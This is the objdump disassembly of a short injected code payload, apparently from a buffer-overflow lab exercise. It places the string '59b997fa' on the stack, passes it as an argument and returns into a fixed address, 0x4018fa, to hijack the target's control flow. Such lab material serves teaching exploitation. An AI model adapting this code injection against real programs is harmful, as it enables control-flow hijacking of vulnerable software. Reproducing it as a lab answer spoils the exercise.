
insert.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 89 e6             	mov    %rsp,%rsi
   3:	c7 06 35 39 62 39    	movl   $0x39623935,(%rsi)
   9:	c7 46 04 39 37 66 61 	movl   $0x61663739,0x4(%rsi)
  10:	c6 46 08 00          	movb   $0x0,0x8(%rsi)
  14:	48 89 f7             	mov    %rsi,%rdi
  17:	68 fa 18 40 00       	push   $0x4018fa
  1c:	c3                   	ret    
